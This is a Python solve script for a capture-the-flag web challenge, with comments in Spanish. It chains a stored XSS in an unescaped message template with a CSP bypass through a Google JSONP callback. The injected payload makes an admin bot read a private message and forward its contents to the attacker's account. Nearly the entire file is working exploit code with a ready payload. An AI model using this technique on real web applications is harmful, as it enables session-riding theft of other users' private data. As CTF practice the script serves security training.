#!/usr/bin/env python3
"""Massagold - Cyber Apocalypse CTF 2026 (web)

XSS almacenado en el contenido del mensaje (`<%- message.content %>` sin escapar).
La CSP permite `script-src 'self' https://www.googleapis.com`; el endpoint JSONP de
Google refleja el parametro `callback` tal cual en un cuerpo `text/javascript`, incluso
cuando lo rechaza por nombre invalido -> ejecucion de JS arbitrario.

El bot admin abre nuestro mensaje, el payload lee el mensaje con la flag y nos la
reenvia por la propia app (la CSP no deja exfiltrar fuera del origen).

Uso: ./solve.py [http://127.0.0.1:8081]
"""
import random
import re
import string
import sys
import time
from urllib.parse import quote

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8081').rstrip('/')
FLAG_MESSAGE_ID = 1  # archivist -> admin, sembrado por entrypoint.js

user = 'lyra_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
password = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

# Dos restricciones del canal JSONP:
#   1. googleapis escapa '>' como > y duplica '\' en la reflexion -> nada de
#      arrow functions ni escapes en la regex.
#   2. '//' solo comenta la primera linea; el JSON de error sigue abajo y se parsea
#      como JS. Terminando en ';void' el '({...})' reflejado queda como expresion valida.
js = (
    "fetch('/messages/%d')"
    ".then(function(r){return r.text()})"
    ".then(function(t){"
    "fetch('/messages',{method:'POST',"
    "headers:{'content-type':'application/x-www-form-urlencoded'},"
    "body:'to_username=%s&content='+encodeURIComponent((t.match(/HTB{[^}]+}/)||[t])[0])"
    "})});void"
) % (FLAG_MESSAGE_ID, user)

payload = (
    '<script src="https://www.googleapis.com/customsearch/v1?callback='
    + quote(js, safe='')
    + '"></script>'
)

s = requests.Session()

r = s.post(f'{BASE}/register', data={'username': user, 'password': password},
           allow_redirects=False)
assert r.status_code in (302, 303), f'registro fallido: {r.status_code}'
print(f'[+] registrado como {user}')

r = s.post(f'{BASE}/messages', data={'to_username': 'admin', 'content': payload},
           allow_redirects=False)
assert r.status_code in (302, 303), f'envio fallido: {r.status_code}'
print('[+] carta enviada a admin, el bot la abrira en breve')

for attempt in range(20):
    time.sleep(3)
    inbox = s.get(f'{BASE}/').text
    ids = re.findall(r'/messages/(\d+)', inbox)

    for mid in ids:
        body = s.get(f'{BASE}/messages/{mid}').text
        flag = re.search(r'HTB\{[^}]+\}', body)
        if flag:
            print(f'[+] flag: {flag.group(0)}')
            sys.exit(0)

    print(f'[.] esperando al bot ({attempt + 1}/20)')

print('[-] sin respuesta del bot')
sys.exit(1)
